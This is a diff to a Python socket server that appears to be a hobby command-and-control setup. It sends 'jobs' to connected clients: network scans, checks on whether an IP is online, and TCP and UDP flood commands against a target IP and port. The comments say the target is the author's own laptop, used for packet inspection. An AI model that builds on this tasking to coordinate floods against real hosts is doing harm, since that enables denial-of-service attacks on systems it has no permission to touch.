@@ -1,8 +1,8 @@
 # INSTRUCTIONS:
 # 1) Change the SERVER const to match your machine's server
-# 2) Change jobs instructions to match IPs and Machines that are online on your network
-# 2) run server.py first
-# 3) run client.py with administrator priviledges
+# 2) Change TARGET_IP to match the IP where you can detect the packets
+# 3) run server.py first
+# 4) run client.py with administrator priviledges
 
 # JOBS:
 # ONE TO ONE
@@ -25,9 +25,14 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((SERVER, PORT))  # passed as tuple
 FORMAT = 'utf-8'
 DISCONNECT_MSG = "!disconnect"
-
+# IP of my laptop so I can test on wireshark and see these packets
+TARGET_IP = '192.168.1.123'
+TARGET_IPBROADCAST = '192.168.1.123/24'
+TARGET_PORT = '80'
 
 # function takes in a socket object and an address, this is unique to each client
+
+
 def ClientHandler(addr, conn):
     print(f"Client {addr} has connected.")
 
@@ -52,9 +57,10 @@ def ClientHandler(addr, conn):
 
             # TODO: send this once (and wait until client has completed the job)
 
-            conn.send(LookupNetworkConn('192.168.1.144/24'))  # WORKS!
-            # conn.send(IsIPOnline('192.168.1.1', 'none')) #WORKS!
+            # conn.send(LookupNetworkConn(TARGET_IPBROADCAST))  # WORKS!
+            # conn.send(IsIPOnline(TARGET_IP, 'none')) #WORKS!
             # conn.send(IsIPOnline('none', 'nouriddin')) #WORKS!
+            # conn.send(TCPFlood(TARGET_IP, TARGET_PORT))  # WORKS!
 
             if msg == DISCONNECT_MSG:  # if client asks to disconnect it will disconnect
                 connected = False
@@ -98,18 +104,12 @@ def IsIPOnline(ipaddr, hostname):
         return f"[IP#3] is {hostname} Online?".encode(FORMAT)
 
 
-def TCPFlood():
-    print("BLANK HAS BEEN TCP FLOODED!")
+def TCPFlood(target_ip, port_num):
+    return f"[TCPF] Please TCP Flood {target_ip} at Port number {port_num}".encode(FORMAT)
 
 
-def UDPFlood():
-    print("BLANK HAS BEEN UDP FLOODED!")
-
-# test
-# CreateJob('IsIPOnline')
-# CreateJob('LookupNetworkConn')
-# CreateJob('TCPF')
-# CreateJob('UDPF')
+def UDPFlood(target_ip, port_num):
+    return f"[UDPF] Please UDP Flood {target_ip} at Port number {port_num}".encode(FORMAT)
 
 
 print("initializing server...")
